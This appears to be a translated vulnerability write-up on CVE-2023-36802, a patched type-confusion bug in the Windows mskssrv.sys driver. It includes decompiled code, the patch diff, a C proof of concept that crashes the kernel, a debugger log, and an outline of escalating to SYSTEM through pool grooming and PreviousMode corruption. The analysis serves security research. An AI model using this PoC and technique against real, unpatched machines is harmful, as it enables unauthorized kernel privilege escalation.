---
title: "N일 연속하여 모든 것을 탈취하는 방법 파트 6 - Windows 커널 LPE SYSTEM 얻기"
description: ""
coverImage: "/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_0.png"
date: 2024-05-23 15:21
ogImage: 
  url: /assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_0.png
tag: Tech
originalTitle: "Chaining N-days to Compromise All: Part 6 — Windows Kernel LPE: Get SYSTEM"
link: "https://medium.com/@vr-blog/chaining-n-days-to-compromise-all-part-6-windows-kernel-lpe-get-system-83cd756ce90a"
---


![이미지](/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_0.png)

이 블로그 포스트는 저희가 X에서 시연한 1-day 풀 체인 익스플로잇에서 사용된 취약성에 대한 마지막 시리즈입니다. 이 블로그 포스트에서는 VMware의 제한된 권한에서 호스트 컴퓨터의 모든 권한을 얻기 위해 SYSTEM으로 권한 상승하는 방법을 소개할 것입니다. 취약성은 mskssrv.sys 드라이버에서 발생하는 CVE-2023-36802이며, 이는 이번 시리즈의 세 번째 블로그에서 다룬 CVE-2023-29360의 동일한 대상입니다.

이 취약성은 실제로 악용되었으며 여러 위협 인텔리전스 그룹에 의해 감지되었습니다. IBM X-Force의 분석 보고서가 발표되었고 chompie1337의 PoC 코드가 10월에 공개된 가운데, 우리의 위협 인텔리전스 서비스인 Fermium-252는 이 취약성의 PoC와 익스플로잇을 모두 2023년 9월부터 보유하고 있습니다.

# 세 번째 블로그를 상기해 보세요

<div class="content-ad"></div>

이 취약점의 대상 드라이버는 이 시리즈의 세 번째 블로그와 동일합니다. DeviceIoControl을 통한 통신 프로세스, Ioctl 요청 처리 과정 등과 같이 중복된 내용은 건너뜁니다. 따라서 이 블로그를 시작하기 전에 CVE-2023-29360이 포함된 세 번째 블로그를 읽는 걸 강력히 권장합니다.

세 번째 블로그에 설명된 대로, 사용자는 IoControlCode가 0x2F0408일 때 FSRendezvousServer::PublishTx에 접근할 수 있습니다. 이 함수는 다음과 같습니다.

```js
__int64 __fastcall FSRendezvousServer::PublishTx(FSRendezvousServer *this, struct _IRP *irp)
{
  ...
  /**
    입력 버퍼 유효성 검사
  **/

  FsContext2 = (const struct FSRegObject *)obj->FileObject->FsContext2;
  // "FsContext2"를 FSRendezvousServer 개체 안에서 찾음
  isfindobj = FSRendezvousServer::FindObject(this, FsContext2);
  KeReleaseMutex((PRKMUTEX)((char *)this + 8), 0);
  if (isfindobj)
  {
    (*(void(__fastcall **)(const struct FSRegObject *))(*(_QWORD *)FsContext2 + 0x38i64))(FsContext2); // FsStreamReg 잠금
    // [*]. FSStreamReg::PublishTx 호출
    result = FSStreamReg::PublishTx(FsContext2, data);
```

사용자가 제공한 값을 유효성 검사한 후, FSStreamReg::PublishTx가 FsContext2를 첫 번째 인수로 호출됩니다. 즉, FsContext2는 FSStreamReg와 관련된 유형의 개체로 추론할 수 있습니다.

<div class="content-ad"></div>

FsContext2 값을 FSStreamReg 개체로 설정하려면 FSRendezvousServer::InitializeStream을 호출해야하며, 이 작업은 IoControlCode가 0x2F0404 일 때에만 호출될 수 있습니다.

```js
__int64 __fastcall FSRendezvousServer::InitializeStream(FSRendezvousServer *this, struct _IRP *irp)
{
  ...
  // 버퍼 할당
  buffer = (FSStreamReg *)operator new(0x1D8ui64, (enum _POOL_TYPE)irp, 0x67657253u); // FSStreamReg의 크기는 `0x1D8`입니다
  if ( buffer )
    FSStreamReg_obj = (volatile signed __int32 *)FSStreamReg::FSStreamReg(buffer); // FSStreamReg 설정
  if ( !FSStreamReg_obj )
    return 0xC000009A;
  // FSStreamReg 초기화
  if ( (unsigned int)Feature_Servicing_TeamsUsingMediaFoundationCrashes__private_IsEnabled() )
    result = FSStreamReg::Initialize((FSStreamReg *)FSStreamRegObj, irp, v11, data, irp->RequestorMode);
  else
    result = FSStreamReg::Initialize((FSStreamReg *)FSStreamRegObj, v10, data, irp->RequestorMode);

  ...
  // FSStreamReg_obj를 FsContext2에 저장
  obj->FileObject->FsContext2 = (PVOID)FSStreamReg_obj;
  _InterlockedIncrement(FSStreamReg_obj + 6);
  ...
```

# CVE-2023–36802

위에서 언급한 대로, obj-`FileObject-`FsContext2가 FSStreamReg 유형으로 간주되고 있었습니다. 그러나 이 가정이 맞는 것일까요?

<div class="content-ad"></div>

FSRendezvousServer::FindObject 함수를 살펴보겠습니다. 이 함수는 FsContext2가 FSRendezvousServer 객체 내에 있는지 확인합니다.

```js
char __fastcall FSRendezvousServer::FindObject(FSRendezvousServer *this, __int64 FsContext2)
{
  if ( FsContext2 )
  {
    if ( *(_DWORD *)(FsContext2 + 0x30) == 1 ) 
    {
      // Type number가 `1`인 경우
      ...
      while ( 1 ) // RegObjectList를 검색합니다.
      {
        Type1RegObj = *(_QWORD **)(this + 0x90);
        if ( !Type1RegObj || (_QWORD *)*Type1ListHead == Type1ListHead || Type1RegObj == Type1ListHead )
          break;
        if ( Type1RegObj != (_QWORD *)8 && Type1RegObj[3] == FsContext2 ) // FsContext2를 찾았습니다!!!
          return 1;
        FSRegObjectList::MoveNext((FSRendezvousServer *)((char *)this + 0x70));
      }
    }
    else 
    {
      // Type number가 `1`이 아닌 경우
      ...
      while ( 1 ) // RegObjectList를 검색합니다.
      {
        Type2RegObj = *(_QWORD **)(this + 0x60);
        if ( !Type2RegObj || (_QWORD *)*Type2ListHead == Type2ListHead || Type2RegObj == Type2ListHead )
          break;
        if ( Type2RegObj != (_QWORD *)8 && Type2RegObj[3] == FsContext2 ) // FsContext2를 찾았습니다!!!
          return 1;
        FSRegObjectList::MoveNext((FSRendezvousServer *)((char *)this + 0x40));
      }
    }
  }
  return 0;
}
```

FSRendezvousServer::FindObject는 FsContext2의 0x30 오프셋에 위치한 타입 번호에 따라 두 가지 종류의 객체가 있다는 것을 명시적으로 보여줍니다. FSStreamReg::FSStreamReg에서 FSStreamReg 타입의 생성자로부터, FSStreamReg의 타입 번호를 2로 알 수 있습니다.

```js
__int64 __fastcall FSStreamReg::FSStreamReg(__int64 FSStreamReg)
{
  ...
  *(_QWORD *)FSStreamReg = &FSStreamReg::`vftable';
  *(_QWORD *)(FSStreamReg + 0x20) = FSStreamReg;
  *(_DWORD *)(FSStreamReg + 0x30) = 2;        // 타입 == 2
  *(_DWORD *)(FSStreamReg + 0x34) = 0x1D8;    // 크기 == 0x1D8
  ...
  return FSStreamReg;
}
```

<div class="content-ad"></div>

mskssrv.sys 드라이버를 분석한 후, type number가 1인 FSContextReg 객체를 찾을 수 있었습니다.

```js
__int64 __fastcall FSRendezvousServer::InitializeContext(FSRendezvousServer *this, struct _IRP *a2)
{
  ...
  FSContextReg = (__int64)operator new(0x78ui64, (enum _POOL_TYPE)a2, 0x67657243u);
  if ( FSContextReg )
  {
    ...
    *(_QWORD *)FSContextReg = &FSContextReg::`vftable'; // VTable 설정
    *(_QWORD *)(FSContextReg + 0x20) = FSContextReg;
    *(_DWORD *)(FSContextReg + 0x30) = 1;    // Type == 1
    *(_DWORD *)(FSContextReg + 0x34) = 0x78; // Size == 0x78
    ...
  }
  ...
  obj->FileObject->FsContext2 = (PVOID)FSContextReg;
  ...
}
```

FSContextReg의 크기로부터 (FSContextReg는 0x78바이트, FSStreamReg는 0x1D8바이트) FSContextReg가 FSStreamReg를 상속받지 않는다는 것을 알 수 있습니다. 자식 클래스는 부모 클래스의 모든 필드를 상속받기 때문에, 자식 클래스는 동일하거나 더 큰 크기를 가져야 합니다. 또한, FSRendezvousServer::FindObject 이후 추가 유효성 검사 루틴이 있으며, FSContextReg는 FSStreamReg::PublishTx의 첫 번째 인수로 사용될 수 있습니다. 따라서, 타입 혼란 취약점이 발생합니다.

타입 혼란이 발생하면 FSStreamReg::PublishTx는 두 객체 간에 상속 관계가 없더라도 FSContextReg 객체를 FSStreamReg 타입으로 처리할 것입니다.

<div class="content-ad"></div>

```js
__int64 __fastcall FSStreamReg::PublishTx(__int64 FsStreamReg, __int64 data)
{
  //
  result = FSStreamReg::CheckRecycle(FsStreamReg, data);
  ...
  // 경계를 벗어난 접근
  kEvent = *(struct _KEVENT **)(FsStreamReg + 0x130);
  if (kEvent)
  {
    KeSetEvent(kEvent, 0, 0);
    FSFrameMdlobj = 0i64;
LABEL_21:
    if (FSFrameMdlobj)
    {
      FSFrameMdl::~FSFrameMdl(FSFrameMdlobj);
      operator delete(FSFrameMdlobj);
    }
  }
  ...
}

__int64 __fastcall FSStreamReg::CheckRecycle(__int64 this, __int64 data)
{
  if (data)
  {
    value1 = *(_DWORD *)(data + 0x24);
    if (value1)
    {
      ...
      // 경계를 벗어난 접근
      v12 = *(_QWORD *)(this + 0x1B0);
      v13 = v5 + *(_DWORD *)(this + 0x1BC);
      v14 = *(int *)(this + 0x1B8);
  ...
}
```

두 객체 간 사이즈 차이로 인해 형태 혼란이 발생하여 경계를 벗어난 접근 취약점이 발생합니다. 공격자는 이러한 기본적인 취약점을 활용하여 메모리 레이아웃을 조작하여 시스템 권한을 획들할 수 있습니다.

# CVE-2023–36802의 패치

```js
-char __fastcall FSRendezvousServer::FindObject(FSRendezvousServer *this, __int64 FsContext2)
+char __fastcall FSRendezvousServer::FindStreamObject(FSRendezvousServer *this, __int64 FsContext2)
{
  if (FsContext2)
  {
-    if (*(_DWORD *)(FsContext2 + 0x30) == 1) // 유형 1 확인
-    {
-      FsContextList = (_QWORD *)((char *)this + 0x80);
-      /* FsContext2를 찾기 위한 링크드 리스트 검색 */
-    }
-    else
+    if (*(_DWORD *)(FsContext2 + 0x30) == 2) // 유형 2 확인
    {
      FsStreamList = (_QWORD *)((char *)this + 80);
      /* FsContext2를 찾기 위한 링크드 리스트 검색 */
    }
  }
  return 0;
}
```

<div class="content-ad"></div>

FSRendezvousServer::FindObject의 이름이 FSRendezvousServer::FindStreamObject로 변경되었습니다. 이 함수는 타입 번호 2의 FSStreamReg 오브젝트를 탐색합니다.

# 취약점 발생

이 취약점을 발생시키기 위해서는 FSContextReg 오브젝트를 만들어야 합니다. 이 오브젝트는 FSRendezvousServer::InitializeContext에서 생성할 수 있으며, 이 함수는 IoControlCode가 0x2F0400일 때 호출됩니다.

```js
__int64 __fastcall FSInitializeContextRendezvous(struct _IRP *a1)
{
  ...
  RendezvousServerObj = operator new(0xA0ui64, v3, 0x73767A52u);
  if(RendezvousServerObj){
    // RendezvousServerObj 초기화
  }
  ServerObj_1C0005048 = RendezvousServerObj_;
  ...
  // `FSRendezvousServer::InitializeContext`에서 FSContextReg 오브젝트 생성
  result = FSRendezvousServer::InitializeContext(RendezvousServerObj, a1);
  FSRendezvousServer::Release(RendezvousServerObj);
  return result;
}
```

<div class="content-ad"></div>

그러면 취약한 함수 중 하나를 트리거하여 FSRendezvousServer::PublishTx(0x2F0408), FSRendezvousServer::PublishRx(0x2F040C), FSRendezvousServer::ConsumeTx(0x2F0410), FSRendezvousServer::ConsumeRx(0x2F0414)를 실행합니다.

아래 PoC는 FSStreamReg::PublishRx를 트리거하는 데 사용됩니다.

```js
#define inputsize 0x100
#define outputsize 0x100
int wmain(int argc, wchar_t** argv) {
  WCHAR DeviceLink[256] = L"\\\\?\\ROOT#SYSTEM#0000#{3c0d501a-140b-11d1-b40f-00a0c9223196}\\{96E080C7-143C-11D1-B40F-00A0C9223196}&{3C0D501A-140B-11D1-B40F-00A0C9223196}";
  HANDLE hDevice = NULL;
  NTSTATUS ntstatus = 0;
  hDevice = CreateFile(
    DeviceLink,
    GENERIC_READ | GENERIC_WRITE,
    0,
    NULL,
    OPEN_EXISTING,
    0x80,
    NULL
  );
  
  PCHAR inputBuffer = (PCHAR)malloc(inputsize);
  PCHAR outputBuffer = (PCHAR)malloc(outputsize);
  
  printf("[+] Initialize Rendezvous\n");
  memset(inputBuffer, 0, inputsize);
  *(DWORD*)(inputBuffer + 0x00) = 0xffffffff; // &1 == Non ZERO
  *(DWORD64*)(inputBuffer + 0x08) = GetCurrentProcessId(); // Current Process ID
  *(DWORD64*)(inputBuffer + 0x10) = 0x4343434344444444; // Some Marker
  *(DWORD64*)(inputBuffer + 0x18) = 0; // 0
  ntstatus = DeviceIoControl(hDevice, 0x2F0400, inputBuffer, inputsize, outputBuffer, outputsize, NULL, NULL); // FSInitializeContextRendezvous
  
  printf("[+] Publish RX --> Trigger OOB Access Vulnerability\n");
  memset(inputBuffer, 0, inputsize);
  *(DWORD*)(inputBuffer + 0x20) = 1; // maxCnt
  *(DWORD*)(inputBuffer + 0x24) = 1; // CNT <= maxCnt 
  *(DWORD64*)(inputBuffer + 0x30) = 0; // Some Value
  ntstatus = DeviceIoControl(hDevice, 0x2F040C, inputBuffer, inputsize, outputBuffer, outputsize, NULL, NULL); // PublishRx
}
```

mskssrv.sys에서 verifier가 활성화되어 있는 경우 충돌이 발생할 수 있습니다.

<div class="content-ad"></div>

```js
1: kd> r
rax=ffffd5019f2d1668 rbx=0000000000000000 rcx=ffffbf8b77206f80
rdx=ffffbf8b76e02b00 rsi=ffffbf8b77206f80 rdi=0000000000000000
rip=fffff80ffac9c9f7 rsp=ffffd5019f2d1610 rbp=ffffbf8b77045e78
 r8=0000000000000001  r9=0000000000000001 r10=0000000000000000
r11=ffffffffffffffff r12=0000000000000000 r13=ffffbf8b76d60cd0
r14=ffffbf8b77207108 r15=ffffbf8b76e02b00
iopl=0         nv up ei pl nz na pe nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040202
MSKSSRV!FSStreamReg::PublishRx+0x43:
fffff80f`fac9c9f7 4d3936          cmp     qword ptr [r14],r14 ds:002b:ffffbf8b`77207108=????????????????

1: kd> dq @rcx L18
ffffbf8b`77206f80  fffff80f`fac941b8 ffffbf8b`77204fe0
ffffbf8b`77206f90  ffffbf8b`77204fe0 00000000`00000002
ffffbf8b`77206fa0  ffffbf8b`77206f80 00000000`00000001
ffffbf8b`77206fb0  00000078`00000001 ffffbf8b`7681f300
ffffbf8b`77206fc0  00000000`00000000 ffffbf8b`77204fd0
ffffbf8b`77206fd0  00000000`00000001 00000000`00001b80
ffffbf8b`77206fe0  43434343`44444444 00000000`00000000
ffffbf8b`77206ff0  00000000`00000000 b3b3b3b3`b3b3b3b3
ffffbf8b`77207000  ????????`???????? ????????`????????
ffffbf8b`77207010  ????????`???????? ????????`????????
ffffbf8b`77207020  ????????`???????? ????????`????????
ffffbf8b`77207030  ????????`???????? ????????`????????

1: kd> pr
KDTARGET: Refreshing KD connection

*** Fatal System Error: 0x00000050
                       (0xFFFFBF8B77207108,0x0000000000000000,0xFFFFF80FFAC9C9F7,0x0000000000000002)

Driver at fault: 
***   MSKSSRV.sys - Address FFFFF80FFAC9C9F7 base at FFFFF80FFAC90000, DateStamp 75a6d2bb
.

A fatal system error has occurred.
Debugger entered on first try; Bugcheck callbacks have not been invoked.

A fatal system error has occurred.

rax=0000000000000000 rbx=0000000000000003 rcx=0000000000000003
rdx=0000000000000070 rsi=0000000000000000 rdi=ffffd70001988180
rip=fffff800470171e0 rsp=ffffd5019f2d0a28 rbp=ffffd5019f2d0b90
 r8=0000000000000065  r9=0000000000000000 r10=0000000000000000
r11=0000000000000010 r12=0000000000000003 r13=ffffbf8b77207108
r14=000000
```

<div class="content-ad"></div>

FSStreamReg::PublishRx 함수는 적절한 FrameMDL 객체를 찾기 위해 0x188과 0x198 Offset에 접근합니다. 0x188과 0x198 오프셋은 경종 영역(out-of-bound area)에 있으므로, 제어 가능한 값을 넣을 수 있습니다. 따라서 조건을 쉽게 만족시킬 수 있고 임의의 감소 코드를 실행할 수 있습니다([*]). ObfDereferenceObject 함수는 이 위치에 있는 객체의 참조 횟수를 감소시킬 것입니다. 

그러나 장애물이 있었습니다. FSContextReg 객체의 크기는 풀 헤더(0x10 바이트)를 포함해 0x90 바이트이므로, LFH (Low Fragmented Heap)를 사용할 것입니다. 이는 0x90 바이트를 할당하여 메모리 레이아웃을 생성해야 함을 의미합니다. 메모리 레이아웃을 만들기 위해 네임드 파이프 객체를 사용할 수 있습니다. 네임드 파이프 객체는 NonPagedPool을 위한 취약점을 이용하기 위해 널리 사용됩니다. 왜냐하면 FSContextReg는 NonPagedPool에 할당되기 때문입니다.

메모리 레이아웃이 네임드 파이프 객체에 의해 조작되면, 아래와 같이 됩니다.

![이미지](/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_1.png)

<div class="content-ad"></div>

위 그림에서와 같이 사용자가 제어할 수 없는 네임드 파이프 개체의 헤더 영역에는 오프셋 0x1C8이 있습니다. 이 문제를 해결하기 위해 이 상황에 적합한 다른 적절한 개체를 찾아보았고, ThreadName 개체를 발견했습니다.

```js
NTSTATUS __stdcall NtSetInformationThread(HANDLE ThreadHandle, THREADINFOCLASS ThreadInformationClass, PVOID ThreadInformation, ULONG ThreadInformationLength)
{
  ...
  switch (ThreadInformationClass)
    ...
    case ThreadNameInformation:
      if (ThreadInformationLength == 16)
      {
        result = ObReferenceObjectByHandleWithTag(ThreadHandle, 0x400u, (POBJECT_TYPE)PsThreadType, prev_mode, 0x79517350u, &ThreadObj, 0i64);
        ...
        // 사용자 주소 유효성 검사 ~~~
        *(UNICODE_STRING *)ThreadName_Unicode = *(UNICODE_STRING *)ThreadInformation;
        ...
        // [1]. 임의 크기의 Non-Paged Pool 할당
        NameMem = (char *)ExAllocatePoolWithTag(NonPagedPoolNx, ThreadName_Unicode.Length + 16i64, 0x6D4E6854u);
        ThreadName = (_UNICODE_STRING *)NameMem;
        if (ThreadName)
        {
          // [2]. 사용자 데이터 시작 위치 +0x10
          NameArea = (wchar_t *)(NameMem + 0x10);
          ThreadName->Buffer = NameArea;
          ThreadName->Length = ThreadName_Unicode.Length;
          ThreadName->MaximumLength = ThreadName_Unicode.Length;
          // 사용자 데이터를 메모리로 복사
          memmove(NameArea, ThreadName_Unicode.Buffer, ThreadName_Unicode.Length);
          ...
          OldName = ThreadObj->ThreadName;
          ThreadObj->ThreadName = ThreadName;
          ...
          // 이전 이름의 메모리를 해제합니다.
          if (OldName)
            ExFreePoolWithTag(OldName, 0x6D4E6854u);
          ...
        }
      }
  ...
}
```

ThreadName은 ThreadNameInformation(0x26)을 사용하여 NtSetInformationThread 시스템 호출을 통해 설정할 수 있습니다. 이 개체는 원하는 크기로 NonPagedPool에 할당되며, 이 개체의 데이터는 처음 0x10바이트를 제외하고 완전히 제어 가능합니다 ([2]). 게다가, ThreadName 개체를 해제하는 코드도 있어서 홀을 만드는 데 유용합니다 ([8]).

<img src="/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_2.png" />

<div class="content-ad"></div>

이 객체를 사용하면 오프셋 0x188 및 0x1C8의 값을 완전히 처리하고 임의의 감소를 성공적으로 발생시킬 수 있습니다. 이 임의의 감소 기본 원리를 통해 현재 스레드 개체의 PreviousMode를 사용자(1)에서 커널(0)으로 변경할 수 있습니다. 여기서 커널 스레드 권한으로 권한 상승을 위한 잘 알려진 방법을 사용할 수 있습니다.

Fermium-252: 사이버 위협 인텔리전스 데이터베이스에는 PoC 및 익스플로잇 코드를 비롯한 자세한 정보가 있습니다. Fermium-252 서비스에 관심이 있다면 contacts@theori.io로 문의하십시오.

# 결론

이 게시물에서는 우리의 1일 완전한 체인 익스플로잇의 마지막 시리즈인 CVE-2023-36802의 분석을 제공했습니다. 이 블로그 시리즈가 끝나더라도 우리는 항상 세계의 위협을 분석하고 다른 흥미로운 연구 주제의 다른 블로그 게시물로 돌아올 것입니다.

<div class="content-ad"></div>

# 참고 자료

- [chompie1337의 GitHub 페이지](https://github.com/chompie1337/Windows_MSKSSRV_LPE_CVE-2023-36802)
- [Nero22k의 GitHub 페이지](https://github.com/Nero22k/cve-2023-36802)
- [보안 인텔리전스 기사](https://securityintelligence.com/x-force/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service/)
- [Microsoft 보안 업데이트 - CVE-2023-36802](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2023-36802)
- [Google Project Zero의 보고서](https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2023/CVE-2023-36802.html)

🔵 웹사이트: [theori.io](https://theori.io) ✉️ 이메일: vr@theori.io